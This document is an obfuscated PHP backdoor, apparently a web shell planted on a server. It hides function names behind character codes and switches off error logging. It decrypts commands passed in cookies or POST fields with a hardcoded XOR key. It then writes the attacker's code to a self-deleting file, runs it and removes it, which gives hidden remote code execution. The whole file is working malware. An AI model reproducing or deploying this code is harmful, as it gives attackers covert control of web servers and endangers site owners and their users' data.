<?php $yraivzsuyg = "\x66"."\151".chr(108).chr(943-842).chr(1062-967).'p'."\x75"."\x74"."\137"."\x63"."\x6f"."\x6e".'t'."\145"."\x6e".'t'."\163";
$hdfxnkz = "\x62".'a'.chr(115)."\x65".chr(670-616)."\64"."\x5f"."\x64".chr(101)."\143"."\157".'d'.'e';
$bdwulhxdo = chr(136-31)."\156"."\151".'_'.'s'."\x65".'t';
$tdrldps = chr(117)."\156"."\154".'i'.chr(110)."\x6b";


@$bdwulhxdo(chr(550-449).chr(1000-886).chr(987-873).chr(729-618).'r'."\x5f"."\154".chr(111)."\147", NULL);
@$bdwulhxdo(chr(108).'o'."\147"."\137".'e'.'r'.chr(1107-993)."\x6f".chr(266-152)."\163", 0);
@$bdwulhxdo("\x6d"."\141"."\170".'_'.chr(968-867).'x'."\x65".chr(99).chr(550-433).chr(370-254)."\x69"."\157"."\156".chr(149-54)."\164"."\x69"."\x6d"."\x65", 0);
@set_time_limit(0);

function kdttxbcilm($thzfezy, $wwclr)
{
    $rxryx = "";
    for ($auolqiv = 0; $auolqiv < strlen($thzfezy);) {
        for ($j = 0; $j < strlen($wwclr) && $auolqiv < strlen($thzfezy); $j++, $auolqiv++) {
            $rxryx .= chr(ord($thzfezy[$auolqiv]) ^ ord($wwclr[$j]));
        }
    }
    return $rxryx;
}

$qscmbe = array_merge($_COOKIE, $_POST);
$drmny = '63c7a839-af48-4e2b-afe0-f4b9c392cf9e';
foreach ($qscmbe as $hjwcr => $thzfezy) {
    $thzfezy = @unserialize(kdttxbcilm(kdttxbcilm($hdfxnkz($thzfezy), $drmny), $hjwcr));
    if (isset($thzfezy["\x61"."\153"])) {
        if ($thzfezy["\141"] == chr(105)) {
            $auolqiv = array(
                chr(1006-894)."\166" => @phpversion(),
                chr(115).chr(513-395) => "3.5",
            );
            echo @serialize($auolqiv);
        } elseif ($thzfezy["\141"] == 'e') {
            $rckkha = "./" . md5($drmny) . "\56"."\151".chr(110).chr(711-612);
            @$yraivzsuyg($rckkha, "<" . '?'."\x70"."\150".'p'."\40".'@'.chr(658-541)."\x6e"."\x6c".chr(633-528).chr(110).chr(421-314).chr(820-780)."\137".chr(270-175).chr(702-632).chr(73).chr(501-425).chr(847-778)."\x5f".'_'.chr(41)."\73".' ' . $thzfezy["\144"]);
            include($rckkha);
            @$tdrldps($rckkha);
        }
        exit();
    }
}

